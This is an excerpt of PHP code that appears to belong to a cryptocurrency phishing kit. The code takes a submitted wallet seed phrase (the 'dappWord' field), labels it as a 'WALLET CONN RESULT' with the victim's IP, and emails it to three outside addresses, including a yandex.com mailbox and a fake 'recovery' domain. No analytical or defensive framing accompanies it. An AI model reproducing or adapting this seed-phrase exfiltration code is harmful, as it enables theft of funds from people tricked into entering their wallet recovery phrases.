...
if ($_POST['dappWord']) {
    ...
    if ($wordCount !== 12 && $wordCount !== 24) {
        ...
        $email_two = "Headies07@yandex.com"; 
        $email_tree = "nftrecoveryteam@ftceurecovery.com";
        $subject = "|----------|WALLET CONN RESULT|------| $ip";
        $sendFirstMail = mail($email_one, $subject, $message, $headers);
        $sendSecondMail = mail($email_two, $subject, $message, $headers);
        $sendThirdMail = mail($email_tree, $subject, $message, $headers);
    }

    // https://ftceurecovery.com/action/verify.php
}
